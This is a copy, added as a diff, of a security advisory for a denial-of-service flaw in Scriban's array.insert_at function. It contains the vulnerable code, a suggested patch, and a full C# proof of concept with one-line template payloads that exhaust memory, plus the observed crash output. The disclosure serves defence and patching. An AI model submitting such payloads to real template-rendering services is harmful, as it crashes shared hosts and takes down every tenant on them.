@@ -1,0 +1,184 @@
+# [H] Scriban: array.insert_at index parameter DoS bypasses LoopLimit and LimitToString
+
+## Summary
+Severity: High
+Advisory: GHSA-24c8-4792-22hx
+CWE: CWE-770
+Ecosystem: NuGet
+CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
+Published: 2026-05-19
+Source: https://github.com/advisories/GHSA-24c8-4792-22hx
+Type: github-advisory
+
+## Affected
+- NuGet: `scriban` — affected >=0 <7.2.0
+- NuGet: `Scriban.Signed` — affected >=0 <7.2.0
+
+## Details
+## Summary
+
+`ArrayFunctions.InsertAt` in Scriban allocates `index - list.Count` null entries in a tight C# `for` loop with no bound on `index`. The function is exposed to template authors as `array.insert_at`, and the fill loop ignores every existing safety control: `LoopLimit`, `LimitToString`, `ObjectRecursionLimit`, and `RecursiveLimit`. A single template such as `{{ [1] | array.insert_at 200000000 'x' | array.size }}` causes `OutOfMemoryException` in well under a second on a host with 1 GB of memory, even when `LoopLimit` is set to `10` and `LimitToString` is set to `100`. Because `OutOfMemoryException` is generally not caught by the template renderer or by typical host applications, the vulnerability terminates the host process, not just the template.
+
+This is a sibling vector to GHSA-xw6w-9jjh-p9cr / GHSA-c875-h985-hvrc / GHSA-v66j-x4hw-fv9g, which patched comparable unbounded primitives in `string * int`, `array.size`, `array.join`, `string.pad_left`, and `string.pad_right`. The 7.0.0 hardening pass (`dde661d` "Apply LoopLimit to internal iteration paths" and `4227fde` "Harden string padding width limits") swept the equivalent loops in `ArrayFunctions` and `StringFunctions` but missed `InsertAt`.
+
+## Details
+
+Reproducible in 7.1.0 (latest tag) and on `master` at `c8094b0`.
+
+`src/Scriban/Functions/ArrayFunctions.cs:369-386`:
+
+```csharp
+public static IEnumerable InsertAt(IEnumerable? list, int index, object? value)
+{
+    if (index < 0)
+    {
+        index = 0;
+    }
+
+    var array = list is null ? new ScriptArray() : new ScriptArray(list);
+    // Make sure that the list has already inserted elements before the index
+    for (int i = array.Count; i < index; i++)
+    {
+        array.Add(null);            // <-- unbounded fill, no StepLoop, no Limit*
+    }
+
+    array.Insert(index, value);
+
+    return array;
+}
+```
+
+The function is registered as the template builtin `array.insert_at` (`array.fmt-cs` and the standard `ArrayFunctions` ScriptObject reflection registration). It is invoked from a template like `[1] | array.insert_at 999999999 "x"`.
+
+Three properties combine to make this exploitable:
+
+1. There is no context-aware overload. Comparable amplification primitives in this same file received a `(TemplateContext, SourceSpan, ...)` overload that calls `StepLoop` per iteration (`AddRange`, `Compact`, `Concat`, `Last`, `Limit`, `Offset`, `Reverse`, `Size`, `Sort`, `Uniq`, `Contains`, `Each`, `Filter`, `Join`, `Map`, `Any` -- see commit `dde661d`). `InsertAt` was not given that treatment. The single `IEnumerable, int, object` signature is what the engine resolves to, so no host configuration changes its behaviour.
+
+2. The loop itself never consults `context.LoopLimit`, `context.LimitToString`, `context.RecursiveLimit`, or `context.ObjectRecursionLimit`. There is no upstream call into `context.StepLoop`, `context.CheckAbort`, or any guard. With `index = 200_000_000`, the C# loop calls `ScriptArray.Add(null)` 200 million times on a `List<object>` whose capacity doubles geometrically; the JIT-compiled tight loop reaches the .NET array allocator faster than the GC can keep up.
+
+3. `OutOfMemoryException` is the actual failure mode. Per Microsoft, `OutOfMemoryException` and friends are not reliably catchable by user code in production CLR runtimes; even when they are caught, large background allocations and triggered GC cycles leave the process in a degraded state. In the PoC below, the renderer wraps the OOM in a `ScriptRuntimeException` because the underlying allocation lands inside the renderer's try block, but on hosts that allocate the array slightly differently (e.g. tighter memory cap, server GC, or higher index value than the host has memory for) the bare `OutOfMemoryException` propagates and crashes the AppDomain.
+
+The pattern that matches the existing fixes is to add a context-aware overload that validates `index` against `LoopLimit` (or `LimitToString` for the resulting array footprint) before the fill loop runs, and to mark the unsafe overload `[ScriptMemberIgnore]`:
+
+```csharp
+[ScriptMemberIgnore]
+public static IEnumerable InsertAt(IEnumerable list, int index, object value) { /* current body */ }
+
+public static IEnumerable InsertAt(TemplateContext context, SourceSpan span, IEnumerable list, int index, object value)
+{
+    if (index < 0) index = 0;
+    if (context.LoopLimit > 0 && index > context.LoopLimit)
+    {
+        throw new ScriptRuntimeException(span,
+            $"array.insert_at index `{index}` exceeds LoopLimit `{context.LoopLimit}`.");
+    }
+    return InsertAt(list, index, value);
+}
+```
+
+Same pattern as `ArrayFunctions.AddRange`, `Compact`, `Concat`, `Last`, `Limit`, etc., introduced by `dde661d`, and as `StringFunctions.PadLeft`/`PadRight` introduced by `4227fde`.
+
+## PoC
+
+Standalone .NET 9 console app referencing `Scriban` 7.1.0 from NuGet.
+
+`poc.csproj`:
+
+```xml
+<Project Sdk="Microsoft.NET.Sdk">
+  <PropertyGroup>
+    <OutputType>Exe</OutputType>
+    <TargetFramework>net9.0</TargetFramework>
+  </PropertyGroup>
+  <ItemGroup>
+    <PackageReference Include="Scriban" Version="7.1.0" />
+  </ItemGroup>
+</Project>
+```
+
+`Program.cs`:
+
+```csharp
+using System;
+using System.Diagnostics;
+using Scriban;
+
+class Program
+{
+    static void Run(string title, string template, int loopLimit, int limitToString, int timeoutSec)
+    {
+        Console.WriteLine($"\n=== {title} ===");
+        var ctx = new TemplateContext { LoopLimit = loopLimit, LimitToString = limitToString };
+        var tpl = Template.Parse(template);
+        var sw = Stopwatch.StartNew();
+        try
+        {
+            var task = System.Threading.Tasks.Task.Run(() => tpl.Render(ctx));
+            if (!task.Wait(TimeSpan.FromSeconds(timeoutSec)))
+            {
+                Console.WriteLine($"  TIMEOUT after {timeoutSec}s -- DoS confirmed");
+                return;
+            }
+            Console.WriteLine($"  output={task.Result?.Length} chars in {sw.Elapsed.TotalSeconds:F2}s");
+        }
+        catch (AggregateException ex)
+        {
+            Console.WriteLine($"  EXCEPTION ({sw.Elapsed.TotalSeconds:F2}s): {ex.InnerException?.GetType().Name}: " +
+                              $"{ex.InnerException?.Message?.Split('\n')[0]}");
+        }
+    }
+
+    static void Main()
+    {
+        // Baseline: small index renders normally.
+        Run("baseline",
+            "{{ ([1] | array.insert_at 5 'x' | array.size) }}",
+            loopLimit: 1000, limitToString: 1048576, timeoutSec: 5);
+
+        // Exploit: 200M index. LoopLimit=10 and LimitToString=100 do NOT protect.
+        Run("DoS via array.insert_at index=200_000_000",
+            "{{ [1] | array.insert_at 200000000 'x' | array.size }}",
+            loopLimit: 10, limitToString: 100, timeoutSec: 30);
+
+        // Exploit: int.MaxValue.
+        Run("DoS via array.insert_at index=int.MaxValue",
+            "{{ [1] | array.insert_at 2147483647 'x' | array.size }}",
+            loopLimit: 10, limitToString: 100, timeoutSec: 15);
+    }
+}
+```
+
+Build and run inside a memory-capped Docker container so the OOM is actual, not theoretical:
+
+```bash
+docker run --rm -v "$PWD":/app -w /app -m 1g mcr.microsoft.com/dotnet/sdk:9.0 \
+    dotnet run -c Release
+```
+
+Observed output:
+
+```
+=== baseline ===
+  output=1 chars in 0.01s
+
+=== DoS via array.insert_at index=200_000_000 ===
+  EXCEPTION (0.68s): ScriptRuntimeException: <input>(1,10) : error : Exception of type 'System.OutOfMemoryException' was thrown.
+
+=== DoS via array.insert_at index=int.MaxValue ===
+  EXCEPTION (0.52s): ScriptRuntimeException: <input>(1,10) : error : Exception of type 'System.OutOfMemoryException' was thrown.
+```
+
+Two observations:
+
+- The exploit triggers in roughly 600 ms inside a 1 GB container. Increasing the host memory simply moves the OOM threshold; the malicious template still wedges the process for the duration of the allocation and the resulting GC pressure, which is itself a denial of service even when the OOM is suppressed.
+- Setting `LoopLimit = 10` and `LimitToString = 100` (effectively the most paranoid tuning a host could pick) makes no difference. The fill loop is in compiled C#, never goes through `StepLoop`, and the result is a `ScriptArray`, not a string, so `LimitToString` is never consulted.
+
+## Impact
+
+Denial of service against any host that renders attacker-controlled or attacker-influenced Scriban templates. This includes the canonical Scriban use cases the README itself lists -- email templating, report templating, in-CMS templating, and Statiq-style static site generators where the template content is part of the data ingested. A single one-line template payload is enough to either OOM the process outright (when the host gives the renderer enough memory headroom for the loop to actually finish) or to wedge the process for tens of seconds while the allocator and GC fight (when memory is tight). On ASP.NET hosts using `app.UseScriban`-style middleware or background workers running per-tenant templates, the OOM terminates the entire process, taking down all tenants.
+
+Severity is consistent with the four DoS GHSAs already published against Scriban (`GHSA-xw6w-9jjh-p9cr` High 7.5, `GHSA-c875-h985-hvrc` High 7.5, `GHSA-v66j-x4hw-fv9g` High 7.5, `GHSA-m2p3-hwv5-xpqw` High 7.5). The attack vector, complexity, and impact are identical: network reachable, low complexity, no privileges, no user interaction, full availability impact, no confidentiality or integrity impact. CVSS 4.0 vector: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` (High, 8.7).
+
+## References
+- https://github.com/scriban/scriban/security/advisories/GHSA-24c8-4792-22hx
+- https://github.com/scriban/scriban
